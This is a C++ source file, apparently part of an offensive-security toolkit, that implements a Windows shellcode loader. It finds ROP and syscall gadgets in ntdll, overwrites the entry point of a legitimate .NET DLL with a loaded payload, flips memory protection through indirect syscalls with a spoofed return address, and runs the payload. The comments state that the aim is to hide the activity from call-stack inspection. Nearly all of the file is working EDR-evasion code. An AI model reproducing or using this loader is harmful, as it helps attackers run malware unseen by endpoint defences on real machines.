#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include "../common.h"

// Combined technique:
// 1. Module Stomping - writes payload into legitimate DLL's .text section (MEM_IMAGE)
// 2. Return Address Spoofing - hides caller address from call stack
// 3. Indirect Syscalls - bypasses KERNELBASE, uses ntdll syscall instruction directly
//
// Result: payload runs from file-backed memory, VirtualProtect call stack shows
// only ntdll frames, no user code or KERNELBASE visible.

#ifndef STOMP_DLL_PATH
#define STOMP_DLL_PATH L"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscordacwks.dll"
#endif

struct SpoofContext {
    PVOID Gadget;
    PVOID SyscallGadget;
    BOOL  Ready;
};

extern "C" void NtProtectVirtualMemory_Indirect(
    HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect, PVOID SyscallGadget);

static BOOL InitSpoofContext(SpoofContext* ctx) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    PBYTE base = NULL;
    DWORD size = 0;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0) {
            base = (PBYTE)hNtdll + sec[i].VirtualAddress;
            size = sec[i].Misc.VirtualSize;
            break;
        }
    }
    if (!base) return FALSE;

    ctx->Gadget = NULL;
    ctx->SyscallGadget = NULL;
    ctx->Ready = FALSE;

    for (PBYTE cur = base; cur <= base + size - 3; cur++) {
        if (!ctx->Gadget && cur[0] == 0x41 && cur[1] == 0xFF && cur[2] == 0xD4) {
            ctx->Gadget = cur;
        }
        if (!ctx->SyscallGadget && cur[0] == 0x0F && cur[1] == 0x05 && cur[2] == 0xC3) {
            ctx->SyscallGadget = cur;
        }
        if (ctx->Gadget && ctx->SyscallGadget) break;
    }

    if (ctx->Gadget && ctx->SyscallGadget) ctx->Ready = TRUE;
    return ctx->Ready;
}

int main(int argc, char* argv[]) {
    SpoofContext ctx = {0};
    PrintSuccess("Stack Spoofing Context Initialized");

    if (!InitSpoofContext(&ctx)) {
        PrintError("Failed to initialize spoof context");
        return 1;
    }
    printf("[+] Gadget : %p\n", ctx.Gadget);
    printf("[+] SyscallGadget : %p\n", ctx.SyscallGadget);

    BYTE* payload = NULL;
    DWORD payloadSize = 0;
    if (!LoadPayload(&payload, &payloadSize)) return 1;

    PrintStep(2, "Loading sacrificial DLL and resolving Entry Point");
    HMODULE hModule = LoadLibraryW(STOMP_DLL_PATH);
    if (!hModule) { PrintError("LoadLibrary failed"); free(payload); return 1; }
    wprintf(L"[+] %s loaded at: 0x%p\n", STOMP_DLL_PATH, hModule);

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

    DWORD entryPointRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
    LPVOID entryPoint = (LPVOID)((BYTE*)hModule + entryPointRVA);
    printf("[+] Entry Point address: 0x%p\n", entryPoint);

    DWORD textSize = 0;
    printf("[+] Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        printf("[DEBUG] Section %d: '%.8s' (Raw: 0x%lx)\n", i,
               sectionHeader[i].Name, sectionHeader[i].SizeOfRawData);
        if (strcmp((char*)sectionHeader[i].Name, ".text") == 0) {
            textSize = sectionHeader[i].Misc.VirtualSize;
        }
    }

    if (payloadSize > textSize) {
        printf("[-] Payload (%lu) exceeds .text section (%lu)\n", payloadSize, textSize);
        free(payload);
        return 1;
    }
    printf("[+] Available memory (from EP): %lu bytes\n", textSize);
    printf("[+] Payload size: %lu bytes\n", payloadSize);

    PrintStep(3, "Stomping module memory");
    printf("[*] Changing protection to RW using Stack Spoofing & Indirect Syscall\n");

    PVOID baseAddr = entryPoint;
    SIZE_T regionSize = payloadSize;
    ULONG oldProtect = 0;

    if (ctx.Ready) {
        NtProtectVirtualMemory_Indirect(GetCurrentProcess(), &baseAddr, &regionSize,
                                         PAGE_READWRITE, &oldProtect, ctx.SyscallGadget);
    } else {
        VirtualProtect(entryPoint, payloadSize, PAGE_READWRITE, (PDWORD)&oldProtect);
    }
    PrintSuccess("Memory protection changed to RW");

    memcpy(entryPoint, payload, payloadSize);
    PrintSuccess("Payload written to entry point");
    free(payload);

    printf("[*] Restoring protection to RX using Stack Spoofing & Indirect Syscall\n");
    baseAddr = entryPoint;
    regionSize = payloadSize;
    ULONG tmpProtect = 0;

    if (ctx.Ready) {
        NtProtectVirtualMemory_Indirect(GetCurrentProcess(), &baseAddr, &regionSize,
                                         oldProtect, &tmpProtect, ctx.SyscallGadget);
    } else {
        VirtualProtect(entryPoint, payloadSize, oldProtect, (PDWORD)&tmpProtect);
    }
    PrintSuccess("Memory protection restored to RX");
    PrintSuccess("Stomping completed successfully");

    PrintStep(4, "Executing payload in main thread");
    printf("[+] Executing payload in main thread at: %p\n", entryPoint);
    ((void(*)())entryPoint)();

    return 0;
}
